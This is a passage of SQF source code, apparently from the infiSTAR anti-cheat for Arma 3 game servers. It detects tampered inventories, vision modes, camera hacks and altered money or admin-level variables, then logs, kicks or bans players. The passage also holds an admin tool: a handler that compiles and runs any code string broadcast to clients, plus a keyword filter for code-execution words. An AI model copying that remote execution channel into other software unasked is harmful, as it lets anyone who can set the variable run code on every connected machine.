"+_AHKickOFF+";                                          }                                          else                                          {                                                if(typeName inSafeZone != 'BOOL')then                                                {                                                      _log = format['inSafeZone type changed: %1',typeName inSafeZone];                                                      [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                      [] spawn "+_AHKickOFF+";                                                };                                          };                                          if(isNil '"+_checkidicheckcheck+"')then                                          {                                                _log = 'AntiAntiHack #2';                                                [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                [] spawn "+_AHKickOFF+";                                          };                                          if!(_rnd6 isEqualTo "+_checkidicheckcheck+")then                                          {                                                _log = 'AntiAntiHack #3';                                                [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                [] spawn "+_AHKickOFF+";                                          };                                          "; if(_UFI)then { _A3AHstring = _A3AHstring + "                                                _inventory = [];                                                {_inventory pushBack _x;} forEach (assignedItems player);                                                {_inventory pushBack _x;} forEach (magazines player);                                                {_inventory pushBack _x;} forEach (weapons player);                                                {_inventory pushBack _x;} forEach (primaryWeaponItems player);                                                {_inventory pushBack _x;} forEach (secondaryWeaponItems player);                                                _inventory pushBack (primaryWeapon player);                                                _inventory pushBack (secondaryWeapon player);                                                _inventory pushBack (uniform player);                                                _inventory pushBack (vest player);                                                _inventory pushBack (backpack player);                                                _inventory pushBack (headgear player);                                                _inventory pushBack (goggles player);                                                if!(_inventory isEqualTo [])then                                                {                                                      {                                                            if(_x != '')then                                                            {                                                                  if((!("+str _UIW+") && (_x in _ForbiddenItems)) || (("+str _UIW+") && !(_x in "+str _ItemWhiteList+")))then                                                                  {                                                                        player removeItem _x;                                                                        player removeWeapon _x;                                                                        player removeMagazine _x;                                                                        if((uniform player) == _x)then {removeUniform player;};                                                                        if((vest player) == _x)then {removeVest player;};                                                                        if((backpack player) == _x)then {removeBackpack player;};                                                                        if((headgear player) == _x)then {removeHeadgear player;};                                                                        if((goggles player) == _x)then {removeGoggles player;};                                                                        player removePrimaryWeaponItem _x;                                                                        player removeSecondaryWeaponItem _x;                                                                        player unlinkItem _x;                                                                        _log = format['BadItem: %1',_x];                                                                        [_name,_puid,'HLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                                  };                                                            };                                                      } forEach _inventory;                                                };                                          "; }; _A3AHstring = _A3AHstring + "                                          if(!isNull player)then                                          {                                                "; if(_CVM)then { _A3AHstring = _A3AHstring + "                                                      if(player == vehicle player)then                                                      {                                                            private['_pvision','_primWeapItems','_curwep'];                                                            _curwep=currentWeapon player;                                                            _pvision=currentVisionMode player;                                                            _primWeapItems=primaryWeaponItems player;                                                            if((_pvision > 1)&&(call _fnc_hasTV))then                                                            {                                                                  _log = format['BadVisionMode: Thermal (%1) current weapon: %2 | weaponsItems player: %3',_pvision,_curwep,weaponsItems player];                                                                  [_name,_puid,'HLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                                  (findDisplay 46) closeDisplay 0;                                                            };                                                            "; if(_MOD == 'EPOCH')then { _A3AHstring = _A3AHstring + "                                                                  if((_pvision == 1)&&(str EPOCH_playerEnergy == '0')&&(call _fnc_hasNV))then                                                                  {                                                                        player action['nvGogglesOff',player];                                                                        uiSleep 0.5;                                                                        _pvision=currentVisionMode player;                                                                        if((_pvision == 1)&&(str EPOCH_playerEnergy == '0'))exitWith                                                                        {                                                                              _log = format['BadVisionMode: Nightvision (%1) current weapon: %2 | weaponsItems player: %3 | EPOCH_playerEnergy: %4',_pvision,_curwep,weaponsItems player,EPOCH_playerEnergy];                                                                              [_name,_puid,'HLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                                              (findDisplay 46) closeDisplay 0;                                                                        };                                                                  };                                                            "; }; _A3AHstring = _A3AHstring + "                                                      };                                                "; }; _A3AHstring = _A3AHstring + "                                                "; if(_LVC)then { _A3AHstring = _A3AHstring + "                                                      _veh = vehicle player;                                                      if(!(player isEqualTo _veh) && !(_vehptype isEqualTo (typeOf _veh)))then                                                      {                                                            _vehptype = typeOf _veh;                                                            if((toLower _vehptype) find 'chute' == -1)then                                                            {                                                                  if(_lvlcheck < time)then                                                                  {                                                                        _lvlcheck = time + 30;                                                                        [_name,_puid,'LVC',player,_vehptype,getPos player] call "+_AH120KICKLOG+";                                                                  };                                                            };                                                      };                                                "; }; _A3AHstring = _A3AHstring + "                                          };                                          "; if(_MIC)then { _A3AHstring = _A3AHstring + "                                                _twelvewasactive = false;                                                if(!isNull (findDisplay 12 displayCtrl 51))then                                                {                                                      _twelvewasactive = true;                                                      _caeM1 = (findDisplay 12 displayCtrl 51) ctrlAddEventHandler ['Draw',''];                                                };                                          "; }; _A3AHstring = _A3AHstring + "                                          uiSleep 2;                                          "; if(_MIC)then { _A3AHstring = _A3AHstring + "                                                if((_twelvewasactive) && (!isNull (findDisplay 12 displayCtrl 51)))then                                                {                                                      _caeM2 = (findDisplay 12 displayCtrl 51) ctrlAddEventHandler ['Draw',''];                                                      if(_caeM2 - _caeM1 > 1)then                                                      {                                                            if((("+str _MOD+" == 'AltisLife')&&(side player != west))||("+str _MOD+" != 'AltisLife'))then                                                            {                                                                  _log = format['MapIcons (%1/%2)',_caeM1,_caeM2];                                                                  [_name,_puid,'HLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                                  [] spawn "+_AHKickOFF+";                                                            };                                                      };                                                };                                          "; }; _A3AHstring = _A3AHstring + "                                          "; if(_CVD)then { _A3AHstring = _A3AHstring + "                                                if(viewDistance > 1600)then {                                                      _log = format['viewDistance %1/1600',viewDistance];                                                      [_name,_puid,'HLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                      [] spawn "+_AHKickOFF+";                                                };                                          "; }; _A3AHstring = _A3AHstring + "                                          if(!isNull player)then                                          {                                                if(alive player)then                                                {                                                      "; if(_CCO)then { _A3AHstring = _A3AHstring + "                                                            _con = vehicle cameraOn;                                                            _veh = vehicle player;                                                            if(!(_con isEqualTo _veh) && !(str _con isEqualTo '<NULL-object>') && (player isEqualTo driver (_veh)))then                                                            {                                                                  uiSleep 1;                                                                  _con = vehicle cameraOn;                                                                  _veh = vehicle player;                                                                  if(alive player)then                                                                  {                                                                        if((_con != _veh) && !(str _con isEqualTo '<NULL-object>') && (player isEqualTo driver (_veh)) && {_con distance _veh > 150} && {(("+str _MOD+" != 'KOTH') || (str(typeOf _con) find 'UAV' == -1))})then                                                                        {                                                                              _log = format['cameraOn: %1 [%2] should be %3 [%4]',typeOf _con,_con,typeOf _veh,_veh];                                                                              [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                              [] spawn "+_AHKickOFF+";                                                                        };                                                                  };                                                            };                                                      "; }; _A3AHstring = _A3AHstring + "                                                      {                                                            if(!isNull _x)then                                                            {                                                                  (vehicle player) enableCollisionWith _x;player enableCollisionWith _x;                                                                  if("+str _OAO+")then{removeAllActions _x;};                                                                  _type = typeOf _x;                                                                  if(_type == 'Box_IND_AmmoVeh_F')then                                                                  {                                                                        _var = _x getVariable['"+_adminbox+"',''];                                                                        if(!isNil '_var')then                                                                        {                                                                              if(_var == '')then {player setPosATL (player modelToWorld [0,-8,0]);};                                                                        };                                                                  };                                                                  "; if(_MOD == 'EPOCH')then { _A3AHstring = _A3AHstring + "                                                                        _getCrypto = _x getVariable['Crypto',0];                                                                        if(typeName _getCrypto == 'SCALAR')then                                                                        {                                                                              if(_type == 'Land_MPS_EPOCH')then                                                                              {                                                                                    if(_getCrypto > 25000 || _getCrypto < 0)then                                                                                    {                                                                                          _log = format['BadCrypto on %1 - %2',_type,_getCrypto];                                                                                          [_name,_puid,'SLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                                                          deleteVehicle _x;                                                                                    };                                                                              }                                                                              else                                                                              {                                                                                    if(_getCrypto != 0)then                                                                                    {                                                                                          _log = format['BadCrypto on %1 - %2',_type,_getCrypto];                                                                                          [_name,_puid,'SLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                                                          deleteVehicle _x;                                                                                    };                                                                              };                                                                        };                                                                  "; }; _A3AHstring = _A3AHstring + "                                                            };                                                      } forEach (player nearObjects 15);                                                      "; if(_KFR)then { _A3AHstring = _A3AHstring + "                                                            _veh = vehicle player;                                                            if(_veh != player)then                                                            {                                                                  _veh enableRopeAttach false;                                                                  _ropes = ropes _veh;                                                                  if!(_ropes isEqualTo [])then                                                                  {                                                                        _log = format['RopeHack?: %1',_ropes];                                                                        [_name,_puid,'HLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                                        {ropeDestroy _x;} forEach _ropes;                                                                  };                                                            };                                                      "; }; _A3AHstring = _A3AHstring + "                                                      "; if(_RPR)then { _A3AHstring = _A3AHstring + "                                                            _veh = vehicle player;                                                            if(_veh != player)then                                                            {                                                                  _cargoArray = ropeAttachedObjects _veh;                                                                  if(str _cargoArray != '[]')then                                                                  {                                                                        {                                                                              if!(crew _x isEqualTo [])then                                                                              {                                                                                    {ropeDestroy _x} forEach (ropes _veh);                                                                              };                                                                        } forEach _cargoArray;                                                                  };                                                            };                                                      "; }; _A3AHstring = _A3AHstring + "                                                      _closeveh = [vehicle player] + ((vehicle player) nearEntities ['AllVehicles',250]);                                                      {                                                            _xobj = _x;                                                            if(!isNull _xobj)then                                                            {                                                                  _attcheXdobjects = attachedObjects _x;                                                                  if(count _attcheXdobjects > 0) then                                                                  {                                                                        _cntQd = {(toLower (typeOf _x)) find 'quad' != -1} count _attcheXdobjects;                                                                        if(_cntQd > 5) then                                                                        {                                                                              detach _xobj;                                                                              {detach _x;} forEach _attcheXdobjects;                                                                              if(_xobj == vehicle player) then                                                                              {                                                                                    _log = format['AttachTo Hack @%1 %2',position _xobj,mapGridPosition _xobj];                                                                                    [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                                    [] spawn "+_AHKickOFF+";                                                                              }                                                                              else                                                                              {                                                                                    _log = format['Attached Objects found @%1 %2  Hack?!',position _xobj,mapGridPosition _xobj];                                                                                    [_name,_puid,'HLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                                              };                                                                        };                                                                        "; if(_CAO)then { _A3AHstring = _A3AHstring + "                                                                              if((vehicle player) in _attcheXdobjects)then                                                                              {                                                                                    _log = format['AttachTo Hack: %1   @%2 %3',name _x,position player,mapGridPosition player];                                                                                    [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                                    [] spawn "+_AHKickOFF+";                                                                              };                                                                        "; }; _A3AHstring = _A3AHstring + "                                                                  };                                                                  "; if(_RVR)then { _A3AHstring = _A3AHstring + "                                                                        _firstx = _x;{ropeDestroy _x;} forEach (ropes _firstx);                                                                  "; }; _A3AHstring = _A3AHstring + "                                                                  if(isPlayer _x)then {if!(getPlayerUID _x in _admins)then {_x hideObject false;};};                                                            };                                                      } forEach _closeveh;                                                };                                          };                                          if!(groupIconsVisible isEqualTo [false,false])then                                          {                                                _log = format['GroupIcons %1',groupIconsVisible];                                                [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                [] spawn "+_AHKickOFF+";                                          };                                          "; if(_MOD == 'EPOCH')then { _A3AHstring = _A3AHstring + "                                                {                                                      if(isNil _x)then                                                      {                                                            _log = format['BadDefinition: %1 is Nil',_x];                                                            [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                            [] spawn "+_AHKickOFF+";                                                      }                                                      else                                                      {                                                            _var = missionNamespace getVariable _x;                                                            if(typeName _var != 'SCALAR')then                                                            {                                                                  _log = format['BadDefinition: %1 is not Scalar',_x];                                                                  [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                  [] spawn "+_AHKickOFF+";                                                            };                                                      };                                                } forEach [                                                      'life_cash','life_adminlevel','life_coplevel','life_fnc_MPexec','life_atmcash',                                                      'EPOCH_playerEnergy','EPOCH_playerHunger','EPOCH_playerThirst','EPOCH_playerStamina','EPOCH_playerCrypto'                                                ];                                                {                                                      if(str(_x select 0) != str(_x select 1))then                                                      {                                                            _log = format['%1: %2',(_x select 2),(_x select 0)];                                                            [_name,_puid,'HLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                            [] spawn "+_AHKickOFF+";                                                      };                                                } forEach [                                                      [EPOCH_clientInit,_EPOCH_clientInit,'EPOCH_clientInit'],                                                      [EPOCH_onEachFrame,_EPOCH_onEachFrame,'EPOCH_onEachFrame'],                                                      [EPOCH_client_rejectPlayer,_EPOCH_client_rejectPlayer,'EPOCH_client_rejectPlayer'],                                                      [EPOCH_clientRespawn,_EPOCH_clientRespawn,'EPOCH_clientRespawn'],                                                      [EPOCH_fnc_playerDeath,_EPOCH_fnc_playerDeath,'EPOCH_fnc_playerDeath'],                                                      [EPOCH_handleGetOut,_EPOCH_handleGetOut,'EPOCH_handleGetOut'],                                                      [EPOCH_fnc_playerFired,_EPOCH_fnc_playerFired,'EPOCH_fnc_playerFired'],                                                      [EPOCH_KeyDown,_EPOCH_KeyDown,'EPOCH_KeyDown'],                                                      [EPOCH_pushCustomVar,_EPOCH_pushCustomVar,'EPOCH_pushCustomVar']                                                ];                                                if!(_rnd1 isEqualTo life_cash)then                                                {                                                      [_name,_puid,'BAN',toArray(format['Altis Life Money Hack: %1',life_cash])] call "+_AH120KICKLOG+";[] spawn "+_AHKickOFF+";                                                };                                                if!(_rnd2 isEqualTo life_adminlevel)then                                                {                                                      [_name,_puid,'BAN',toArray(format['Altis Life Adminlevel Hack: %1',life_adminlevel])] call "+_AH120KICKLOG+";[] spawn "+_AHKickOFF+";                                                };                                                if!(_rnd3 isEqualTo life_coplevel)then                                                {                                                      [_name,_puid,'BAN',toArray(format['Altis Life Coplevel Hack: %1',life_coplevel])] call "+_AH120KICKLOG+";[] spawn "+_AHKickOFF+";                                                };                                                if!(_rnd4 isEqualTo life_fnc_MPexec)then                                                {                                                      [_name,_puid,'BAN',toArray('Altis Life Hack: life_fnc_MPexec')] call "+_AH120KICKLOG+";[] spawn "+_AHKickOFF+";                                                };                                                if!(_rnd5 isEqualTo life_atmcash)then                                                {                                                      [_name,_puid,'BAN',toArray('Altis Life Hack: life_atmcash')] call "+_AH120KICKLOG+";[] spawn "+_AHKickOFF+";                                                };                                                if(!isNil 'EPOCH_currentVehicle')then                                                {                                                      if(typeName EPOCH_currentVehicle != 'OBJECT')then                                                      {                                                            _log = 'BadDefinition: EPOCH_currentVehicle is not an Object';                                                            [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                            [] spawn "+_AHKickOFF+";                                                      };                                                }else{EPOCH_currentVehicle=vehicle player;};                                                if(!isNil 'EPOCH_target')then                                                {                                                      if(typeName EPOCH_target != 'OBJECT')then                                                      {                                                            _log = 'BadDefinition: EPOCH_target is not an Object';                                                            [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                            [] spawn "+_AHKickOFF+";                                                      };                                                }else{EPOCH_target=objNull;};                                                if(!isNull EPOCH_target)then                                                {                                                      if(EPOCH_target isEqualTo player)then                                                      {                                                            _log = format['setVelocityTarget: %1', EPOCH_target];                                                            [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                            [] spawn "+_AHKickOFF+";                                                      };                                                };                                                if(EPOCH_playerEnergy > 2500 || EPOCH_playerEnergy < 0)then                                                {                                                      _log = format['Energy: %1',EPOCH_playerEnergy];                                                      [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                      [] spawn "+_AHKickOFF+";                                                };                                                if(EPOCH_playerHunger > 5000 || EPOCH_playerHunger < 0)then                                                {                                                      _log = format['Hunger: %1',EPOCH_playerHunger];                                                      [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                      [] spawn "+_AHKickOFF+";                                                };                                                if(EPOCH_playerThirst > 2500 || EPOCH_playerThirst < 0)then                                                {                                                      _log = format['Thirst: %1',EPOCH_playerThirst];                                                      [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                      [] spawn "+_AHKickOFF+";                                                };                                                if(EPOCH_playerStamina > 2500 || EPOCH_playerStamina < 0)then                                                {                                                      _log = format['Stamina: %1',EPOCH_playerStamina];                                                      [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                      [] spawn "+_AHKickOFF+";                                                };                                                if(EPOCH_playerCrypto > 25000)then                                                {                                                      _log = format['Crypto: %1',EPOCH_playerCrypto];                                                      [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                      [] spawn "+_AHKickOFF+";                                                };                                                if(EPOCH_playerCrypto < 0)then                                                {                                                      _log = format['Crypto: %1 (reverted to 0)',EPOCH_playerCrypto];                                                      [_name,_puid,'HLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                      EPOCH_playerCrypto = 0;                                                      true call EPOCH_pushCustomVar;                                                };                                          "; }; _A3AHstring = _A3AHstring + "                                          "+_ninetwo+" = true;                                          if(!isNil '"+_ninetwothread+"')then {terminate "+_ninetwothread+";"+_ninetwothread+" = nil;};                                    };                              };                              "+_AH_RunCheckARRAY+" pushBack 9;                        };                  }else{"+_AH_RunCheckARRAY+"="+_AH_RunCheckARRAY+" + [2,3,4,5,6,7,8,9];};                  _globaltime = serverTime;if(_globaltime > 18000)then {_globaltime = time;};_hours = floor(_globaltime/60/60);_minutes = (round(_globaltime/60)-(_hours*60));if(_minutes < 10)then {_minutes = format['0%1',_minutes];};_seconds = '120';                  _devLog = format['<infiSTAR.de> VERSION: 23-04-2015 infiSTAR.de AHAT (v0148) - server running: %1:%2:%3',_hours,_minutes,_seconds];diag_log _devLog;                  systemChat '<infiSTAR.de> Successfully Loaded In.';                  if(_puid in "+str _devs+")then {diag_log str _admins;};                  "+_AH_RunCheckENDVAR+" = 'k';            };            _arrayAH_MAIN_BLOCK = toArray(str _AH_MAIN_BLOCK);            "+_sumAH_MAIN_BLOCK+" = 0;            {                  _val = call {                        if(_x <= 10)exitWith {_x};                        if(_x > 70)exitWith {_x/69};                        if(_x > 65)exitWith {_x/62};                        if(_x > 60)exitWith {_x/53};                        if(_x > 50)exitWith {_x/49};                        if(_x > 40)exitWith {_x/37};                        if(_x > 30)exitWith {_x/26};                        if(_x > 25)exitWith {_x/24};                        if(_x > 20)exitWith {_x/18};                        if(_x > 15)exitWith {_x/14};                        if(_x > 10)exitWith {_x/9};                        _x                  };                  "+_sumAH_MAIN_BLOCK+" = "+_sumAH_MAIN_BLOCK+" + _val;            } forEach _arrayAH_MAIN_BLOCK;            "+_AH_MAIN_BLOCK+" = _AH_MAIN_BLOCK;            publicVariable '"+_AH_MAIN_BLOCK+"';                        _RunOnClients = {                  if((isNil '_puid') || (isNil '_name'))then {                        _log = 'No UID || NAME';                        [name player,getPlayerUID player,'HLOG',toArray(_log)] call "+_AH120KICKLOG+";                        [] spawn "+_AHKickOFF+";                  };                  if((_puid == '_SP_PLAYER_')||(_puid == ''))then {                        _log = 'Error starting AH on Client';                        [_name,_puid,'HLOG',toArray(_log)] call "+_AH120KICKLOG+";                        [] spawn "+_AHKickOFF+";                  };                  _admins = "+str _admins+";                  call _AH_MAIN_BLOCK;                  if(_puid in _admins)then                  {                        if(isNil '"+_AH_HackLogArrayRND+"')then {"+_AH_HackLogArrayRND+" = [];};                        if(isNil 'AH_HackLogArray')then {AH_HackLogArray = "+_AH_HackLogArrayRND+";};                        '"+_AH_HackLogArrayRND+"' addPublicVariableEventHandler                        {                              _array = _this select 1;                              AH_HackLogArray = _array;                              if(str _array != '[]')then {                                    _log = _array select ((count _array)-1);                                    if(isNil 'AdminAnnounceDisabled')then                                    {                                          cutText [_log, 'PLAIN DOWN'];                                          hint _log;                                    };                                    diag_log _log;                              };                        };                        if(isNil '"+_AH_SurvLogArrayRND+"')then {"+_AH_SurvLogArrayRND+" = [];};                        if(isNil 'AH_SurvLogArray')then {AH_SurvLogArray = "+_AH_SurvLogArrayRND+";};                        '"+_AH_SurvLogArrayRND+"' addPublicVariableEventHandler                        {                              _array = _this select 1;                              AH_SurvLogArray = _array;                              if(str _array != '[]')then {                                    _log = _array select ((count _array)-1);                                    diag_log _log;                              };                        };                        if(isNil '"+_AH_AdmiLogArrayRND+"')then {"+_AH_AdmiLogArrayRND+" = [];};                        if(isNil 'AH_AdmiLogArray')then {AH_AdmiLogArray = "+_AH_AdmiLogArrayRND+";};                        '"+_AH_AdmiLogArrayRND+"' addPublicVariableEventHandler                        {                              _array = _this select 1;                              AH_AdmiLogArray = _array;                              if(str _array != '[]')then {                                    _log = _array select ((count _array)-1);                                    diag_log _log;                              };                        };                        if(isNil '"+_TMPBAN+"')then {"+_TMPBAN+" = [];} else {if(typeName "+_TMPBAN+" != 'ARRAY')then {"+_TMPBAN+" = [];};};                        if(isNil 'PVAH_AHTMPBAN')then {PVAH_AHTMPBAN = "+_TMPBAN+";};                        '"+_TMPBAN+"' addPublicVariableEventHandler                        {                              PVAH_AHTMPBAN = "+_TMPBAN+";                        };                  };                  if(isNil '"+_adminsA+"')then                  {                        _log = 'Temp Admin Array - ARRAY is Nil';                        [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                        [] spawn "+_AHKickOFF+";                  };                  if(typeName "+_adminsA+" != 'ARRAY')then                  {                        _log = 'Temp Admin Array - TYPE CHANGED';                        [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                        [] spawn "+_AHKickOFF+";                  };                  if(_puid in "+_adminsA+")then                  {                        if!(_puid in _admins)exitWith                        {                              _log = 'Attempted to Use the AdminMenu';                              [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                              [] spawn "+_AHKickOFF+";                        };                        infiSTAR_MOD = "+str _MOD+";                        infiSTAR_ADMINS = "+_adminsA+";                        infiSTAR_DEVS = "+str _devs+";                        if(isNil '"+_AdminLoaded+"')then                        {                              "+_AdminLoaded+" = true;                              INFISTARVERSION='23-04-2015-v0148';                              OPEN_ADMIN_MENU_KEY = "+str _OPEN_ADMIN_MENU_KEY+";                              passwordAdmin = "+str _passwordAdmin+";                              if(isNil'fnc_AdminReq')then {fnc_AdminReq = compileFinal 'if(isNil''"+_YourPlayerToken+"'')then{"+_YourPlayerToken+"='''';};PVAH_AdminReq = ["+_YourPlayerToken+",_this];publicVariableServer ''PVAH_AdminReq'';PVAH_AdminReq=nil;';};                              [] spawn {                                    systemChat 'Requesting infiSTAR.de Admin code..!';                                    [1234,player,getPlayerUID player] call fnc_AdminReq;                                    _mytime = time;                                    waitUntil {if(time - _mytime > 20)exitWith {(findDisplay 46) closeDisplay 0;};!isNil '"+_MAIN_CODE+"';};                                    call "+_MAIN_CODE+";                                    diag_log format['<infiSTAR.de> OPEN_ADMIN_MENU_KEY: %1',OPEN_ADMIN_MENU_KEY];                                    ADMINLEVELACCESS = compileFinal '                                          _level = [];                                          _puid = getPlayerUID player;                                          switch (true) do {                                                case (_puid in "+str _devs+"):{_level = ("+str _adminLevel1+"+"+str _adminLevel2+"+"+str _adminLevel3+");};                                                case (_puid in "+str _adminLevel1_UIDs+"):{_level = "+str _adminLevel1+";};                                                case (_puid in "+str _adminLevel2_UIDs+"):{_level = "+str _adminLevel2+";};                                                case (_puid in "+str _adminLevel3_UIDs+"):{_level = "+str _adminLevel3+";};                                                default {hint ''not an admin'';};                                          };                                          _level                                    ';                              };                              admin_d0 = {[_this,0] call admin_d0_MASTER;};                              admin_d0_server = {[_this,1] call admin_d0_MASTER;};                              admin_d0_target = {[_this,2] call admin_d0_MASTER;};                              admin_d0_MASTER = {                                    _do = _this select 0 select 0;                                    _opt = _this select 1;                                    if(typeName _do != 'STRING')exitWith {systemChat 'admin_d0 stopped - code needs to be a STRING!';};                                    _fnc_BPPVV =                                    {                                          _search = '$RE$';                                          _fulldo = count _do;                                          {                                                _replace = toLower _x;                                                for '_i' from 0 to _fulldo do                                                {                                                      _found = toLower(_do) find _replace;                                                      if(_found == -1)exitWith {_do};                                                      if(_found > -1)then                                                      {                                                            _doNew = ((_do select [0,(_found+1)]) + _search + (_do select [(_found+1),(_fulldo-1)]));                                                            _do = _doNew;                                                      };                                                      _do                                                };                                          } forEach ['call','compile','spawn','exec','loadFile','preprocessFile','tostring','.sqf'];                                    };                                    switch _opt do {                                          case 0:{                                                call _fnc_BPPVV;                                                [69,player,_opt,_do] call fnc_AdminReq;                                          };                                          case 1:{                                                call _fnc_BPPVV;                                                [69,player,_opt,_do] call fnc_AdminReq;                                          };                                          case 2:{                                                _playerObj = _this select 0 select 1;                                                if(isNil '_playerObj')exitWith {systemchat 'admin_d0 has no object';};                                                if(typeName _playerObj != 'OBJECT')exitWith {systemchat 'admin_d0 has no object';};                                                if(isNull _playerObj)exitWith {systemchat 'admin_d0 has no object';};                                                call _fnc_BPPVV;                                                [69,player,_opt,_do,_playerObj] call fnc_AdminReq;                                          };                                    };                              };                              "; if(_LogAdminActions)then { _A3AHstring = _A3AHstring + "                                    if(isNil 'fnc_adminLog')then {if(_puid in "+str _devs+")then {fnc_adminLog = compileFinal '';}else{fnc_adminLog = compileFinal '[profileName,getPlayerUID player,''ALOG'',toArray _this] call "+_AH120KICKLOG+";';};};                              "; }else{ _A3AHstring = _A3AHstring + "                                    if(isNil 'fnc_adminLog')then {fnc_adminLog = compileFinal '';};                              "; }; _A3AHstring = _A3AHstring + "                        };                  };                  "+_massMessage+"=nil;'"+_massMessage+"' addPublicVariableEventHandler {(_this select 1) spawn bis_fnc_dynamictext;"+_massMessage+"=nil;};                  "+_clientdo+"=nil;'"+_clientdo+"' addPublicVariableEventHandler {                        _received = (_this select 1);                        if(typeName _received == 'STRING')then {_received = compile _received;};                        if(typeName _received != 'CODE')exitWith {};                        call _received;                        "+_clientdo+"=nil;                  };                  if(!isNil 'BPDCODE')then {call BPDCODE;BPDCODE=nil;};            };            _arrayRunOnClients = toArray(str _RunOnClients);            "+_sumRunOnClients+" = 0;            {                  _val = call {                        if(_x <= 10)exitWith {_x};                        if(_x > 70)exitWith {_x/69};                        if(_x > 65)exitWith {_x/62};                        if(_x > 60)exitWith {_x/53};                        if(_x > 50)exitWith {_x/49};                        if(_x > 40)exitWith {_x/37};                        if(_x > 30)exitWith {_x/26};                        if(_x > 25)exitWith {_x/24};                        if(_x > 20)exitWith {_x/18};                        if(_x > 15)exitWith {_x/14};                        if(_x > 10)exitWith {_x/9};                        _x                  };                  "+_sumRunOnClients+" = "+_sumRunOnClients+" + _val;            } forEach _arrayRunOnClients;            "+_RunOnClients+" = _RunOnClients;            publicVariable '"+_RunOnClients+"';                        _FNC_PVAH_AdminReq = {                  _playableUnits = "+str _admins+";                                    _array = _this select 1;                  if(isNil '_array')exitWith {                        _mytime = call fnc_getserverTime;                        _log = _mytime + 'AdminReq is Nil';                        _log call FNC_A3_SURVEILLANCELOG;                  };                  if(typeName _array != 'ARRAY')exitWith {                        _mytime = call fnc_getserverTime;                        _log = _mytime + format['AdminReq wrong typeName: %1   %2',typeName _array,_array];                        _log call FNC_A3_SURVEILLANCELOG;                  };                                    _option = _array select 0;                  if(isNil '_option')exitWith {                        _mytime = call fnc_getserverTime;                        _log = _mytime + 'AdminReq option is Nil';                        _log call FNC_A3_SURVEILLANCELOG;                  };                  if(typeName _option != 'SCALAR')exitWith {                        _mytime = call fnc_getserverTime;                        _log = _mytime + format['AdminReq option wrong typeName: %1   %2',typeName _option,_option];                        _log call FNC_A3_SURVEILLANCELOG;                  };                                    _playerObj = _array select 1;                  if(isNil '_playerObj')exitWith {                        _mytime = call fnc_getserverTime;                        _log = _mytime + 'AdminReq playerObj is Nil';                        _log call FNC_A3_SURVEILLANCELOG;                  };                  if(typeName _playerObj != 'OBJECT')exitWith {                        _mytime = call fnc_getserverTime;                        _log = _mytime + format['AdminReq playerObj wrong typeName: %1   %2',typeName _playerObj,_playerObj];                        _log call FNC_A3_SURVEILLANCELOG;                  };                  if(isNull _playerObj)exitWith {                        _mytime = call fnc_getserverTime;                        _log = _mytime + 'AdminReq playerObj is Null';                        _log call FNC_A3_SURVEILLANCELOG;                  };                  if(!isPlayer _playerObj)exitWith {                        _mytime = call fnc_getserverTime;                        _log = _mytime + 'AdminReq playerObj is not a player';                        _log call FNC_A3_SURVEILLANCELOG;                  };                                    _clientID = (owner _playerObj);                  _clientUID = (getPlayerUID _playerObj);                  _clientName = (name _playerObj);                                    _tokenreceived = _this select 0;                  if(isNil '_tokenreceived')exitWith {                        _mytime = call fnc_getserverTime;                        _log = _mytime + 'AdminReq tokenreceived is Nil';                        _log call FNC_A3_SURVEILLANCELOG;                  };                  if(typeName _tokenreceived != 'STRING')exitWith {                        _mytime = call fnc_getserverTime;                        _log = _mytime + format['AdminReq tokenreceived wrong typeName: %1   %2',typeName _tokenreceived,_tokenreceived];                        _log call FNC_A3_SURVEILLANCELOG;                  };                                                      if(isNil '_clientUID')then {_clientUID == '';};                  if(_clientUID isEqualTo '')then                  {                        if(isNil '"+_PoopTokenArray+"')then {"+_PoopTokenArray+" = [];};                        _foundtokenid = "+_PoopTokenArray+" find _tokenreceived;                        if(_foundtokenid > 0)then                        {                              _puidfound = "+_PoopTokenArray+" select (_foundtokenid - 1);                              if(!isNil '_puidfound')then                              {                                    _clientUID = _puidfound;                                    {if(getPlayerUID _x == _clientUID)exitWith {_clientName = name _x;};} forEach playableUnits;                                                            _mytime = call fnc_getserverTime;                                    _log = _mytime + format['%1(%2) | AdminReq - SERVER RESOLVED UID!',_clientName,_clientUID];                                    _log call FNC_A3_SURVEILLANCELOG;                              };                        };                  };                  _result=false;                  _result = [_clientUID,_tokenreceived] call "+_server_checkTokenR+";                  if(!_result)exitWith{                        _mytime = call fnc_getserverTime;                        _log = _mytime + format['%1(%2) | AdminReq - BadToken %3',_clientName,_clientUID,_tokenreceived];                        _log call FNC_A3_SURVEILLANCELOG;                  };                                    _locDevs = "+str _devs+";                  